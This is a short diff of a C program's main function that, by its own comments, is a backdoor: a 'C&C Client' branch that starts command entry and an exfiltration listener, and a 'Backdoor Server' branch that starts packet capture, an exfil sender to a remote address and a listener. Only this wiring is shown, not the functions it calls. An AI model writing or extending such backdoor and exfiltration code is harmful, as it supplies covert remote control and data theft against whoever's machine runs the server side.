@@ -24,7 +24,7 @@ NOTES: See the program help for usage instructions and the attached
 #include <unistd.h>
 #include <sys/types.h>
 
-#include "capture.h"
+#include "server.h"
 #include "client.h"
 #include "defs.h"
 #include "mask.h"
@@ -87,16 +87,18 @@ int main(int argc, char *argv[])
 
 	ipaddr = resolve(rmthost);
 
-	if (client)
+	if (client) // C&C Client
 	{
-		// Start command listener
+		// Start command entry
 		backdoor_client(ipaddr, port, duplex);
-		// Start exfil sender
+		// Start exfil listener
+		exfil_listen();
 	}
-	else
+	else // Backdoor Server
 	{
 		pcap_init(filter);
 
+		exfil_start(ipaddr);
 		srv_listen(duplex);
 	}
 	
